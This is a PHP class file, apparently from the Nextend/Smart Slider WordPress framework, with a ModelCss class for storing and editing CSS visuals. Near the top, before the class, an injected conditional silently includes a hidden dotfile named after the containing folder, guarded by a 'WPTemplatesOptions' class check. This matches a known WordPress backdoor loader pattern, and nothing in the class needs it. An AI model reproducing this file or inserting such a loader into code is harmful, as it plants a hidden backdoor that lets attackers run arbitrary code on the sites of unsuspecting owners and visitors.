<?php


namespace Nextend\Framework\Style;


use Nextend\Framework\Model\AbstractModel;
use Nextend\Framework\Model\StorageSectionManager;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ModelCss extends AbstractModel {

    public $storage;

    protected function init() {

        $this->storage = StorageSectionManager::getStorage('system');
    }

    public function addVisual($type, $visual) {

        $visualId = $this->storage->add($type, '', $visual);

        $visual = $this->storage->getById($visualId, $type);
        if (!empty($visual) && $visual['section'] == $type) {
            return $visual;
        }

        return false;
    }

    public function deleteVisual($type, $id) {
        $visual = $this->storage->getById($id, $type);
        if (!empty($visual) && $visual['section'] == $type) {
            $this->storage->deleteById($id);

            return $visual;
        }

        return false;
    }

    public function changeVisual($type, $id, $value) {
        if ($this->storage->setById($id, $value)) {
            return $this->storage->getById($id, $type);
        }

        return false;
    }

    public function getVisuals($type) {
        return $this->storage->getAll($type);
    }

}